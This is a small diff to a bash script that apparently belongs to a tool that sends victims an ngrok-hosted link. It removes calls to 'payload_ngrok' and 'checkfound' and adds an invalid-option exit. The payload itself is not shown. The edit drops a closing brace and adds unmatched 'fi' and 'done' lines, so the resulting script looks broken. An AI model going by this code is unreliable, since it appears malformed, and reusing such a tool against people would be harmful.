@@ -274,9 +274,7 @@ sleep 1
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Link Chack Your New Tab Open Ngrok \e[0m\e[1;77m %s\e[0m\n" $link
 
-payload_ngrok
-checkfound
-}
+
 
 start1() {
 if [[ -e sendlink ]]; then
@@ -293,3 +291,9 @@ option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 2 ]]; then
 
 
+echo
+		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
+		         sleep 2
+                         exit
+		         fi
+                         done
